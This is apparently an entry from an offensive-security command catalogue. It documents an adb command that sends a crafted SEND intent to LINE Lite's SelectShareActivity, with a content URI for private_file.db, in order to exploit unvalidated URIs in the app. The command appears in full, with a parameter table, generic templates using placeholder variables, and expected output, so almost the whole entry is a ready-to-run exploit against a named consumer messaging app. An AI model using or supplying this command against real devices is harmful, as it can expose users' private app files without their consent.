---
data: >-
  adb shell am start -n
  com.linecorp.linelite/.ui.android.share.SelectShareActivity -a
  android.intent.action.SEND -d
  "content://com.linecorp.linelite.file_provider/files/private_file.db" --eu
  android.intent.extra.STREAM
  "content://com.linecorp.linelite.file_provider/files/private_file.db"
tags:
  - exploit
  - android
  - intent
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:42.039Z'
id: db715c41-fa8d-4fef-897d-aec853ce90c4
verified: false
validated: true
submitted: true
---
# adb-send-intent

## Command

```bash
adb shell am start -n com.linecorp.linelite/.ui.android.share.SelectShareActivity -a android.intent.action.SEND -d "content://com.linecorp.linelite.file_provider/files/private_file.db" --eu android.intent.extra.STREAM "content://com.linecorp.linelite.file_provider/files/private_file.db"
```

## Description

Sends a crafted intent to the target activity via ADB to trigger file operations. Used to exploit unvalidated URIs in LINE Lite.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-n com.linecorp.linelite/.ui.android.share.SelectShareActivity` | Component name | Yes |
| `-a android.intent.action.SEND` | Intent action | Yes |
| `-d URI` | Data URI | Yes |
| `--eu extra` | Intent extras | No |

## Examples

### Basic Usage

```bash
adb shell am start -n com.linecorp.linelite/.ui.android.share.SelectShareActivity -a android.intent.action.SEND -d "content://example"
```

### Advanced Usage

```bash
adb shell am start -n $COMPONENT -a $ACTION -d "$URI" --eu $EXTRA
```

## Expected Output

Starting: Intent { act=android.intent.action.SEND dat=content://... cmp=com.linecorp.linelite/... } – activity launches.

## Related

- [[Related Procedure: Trigger File Copy via Exported Activity]]
